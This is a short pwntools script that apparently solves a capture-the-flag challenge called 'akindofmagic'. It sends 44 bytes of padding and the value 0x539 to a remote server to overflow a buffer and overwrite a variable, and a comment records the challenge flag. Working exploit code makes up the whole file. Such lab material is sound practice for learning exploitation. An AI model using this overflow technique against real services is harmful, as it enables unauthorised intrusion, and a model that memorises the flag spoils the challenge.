# flag{i_hope_its_still_cool_to_use_1337_for_no_reason}

from pwn import *

padding = 44
hexNum = 0x539

host = "143.198.184.186"
port = 5000

# s = process("./akindofmagic")
s = connect(host, port)

print(s.recvline())

payload = b""
payload += b"A"*padding
payload += p64(hexNum)

s.sendline(payload)
print(s.recvall())

s.close()
